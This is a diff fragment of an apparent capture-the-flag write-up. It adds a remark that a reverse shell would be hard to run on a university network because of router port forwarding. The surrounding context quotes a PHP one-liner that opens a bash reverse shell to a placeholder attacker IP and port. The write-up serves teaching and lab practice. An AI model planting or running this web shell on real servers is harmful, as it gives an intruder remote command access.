@@ -96,6 +96,8 @@ Congratulations! You got the flag!
 > ```
 > <?php shell_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker IP address>/<port number> 0>&1'"); ?>
 > ```
+> 
+> Getting a reverse shell to work on the university network would be very difficult, because the port forwarding on the routers would need to be configured, which we do not have control over.
 
 ## Conclusion
 
